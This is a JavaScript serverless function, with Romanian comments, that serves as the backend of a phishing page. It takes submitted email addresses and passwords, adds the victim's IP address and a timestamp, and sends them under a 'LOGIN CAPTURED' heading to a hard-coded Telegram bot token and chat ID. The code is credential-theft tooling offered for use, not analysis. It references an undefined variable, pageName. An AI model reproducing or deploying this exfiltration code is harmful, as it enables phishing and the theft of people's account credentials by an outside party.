// ============================================
// api/send.js - Vercel Serverless Function
// Trimite datele de login pe Telegram
// ============================================

module.exports = async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    console.log('📥 Request primit pe /api/send');

    // CONFIGURARE TELEGRAM
    const token = '8145729148:AAFFx2W3AfF9sNYLZXnoXXFkTA1g3xPAY7A';
    const chatId = '5054827109';

    try {
        const { email, pass } = req.body;

        // Validare
        if (!email || !pass) {
            return res.status(400).json({ error: 'Missing email or pass' });
        }

        // Info suplimentare
        const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
                    || req.socket?.remoteAddress
                    || 'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const now = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
 
        // Construiește mesajul Telegram
        const message =
            `🔐 <b>LOGIN CAPTURED</b>\n` +
            `━━━━━━━━━━━━━━━\n` +
            `📄 <b>Pagină:</b> ${pageName}\n` +
            `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
            `🔑 <b>Passwort:</b> <code>${escapeHtml(pass)}</code>\n` +
            `🌐 <b>IP:</b> ${ip}\n` +
            `🕐 <b>Zeit:</b> ${now}`;

        // Trimite la Telegram
        const tgRes = await fetch(
            `https://api.telegram.org/bot${token}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            }
        );

        const data = await tgRes.json();
        console.log('✅ Telegram response:', data.ok);

        return res.status(200).json({
            ok: true,
            telegram_sent: data.ok === true,
            telegram: data
        });

    } catch (err) {
        console.error('❌ Eroare:', err.message);
        return res.status(500).json({
            error: 'Server error',
            details: err.message
        });
    }
};

// Helper - escape HTML pentru Telegram
function escapeHtml(text) {
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}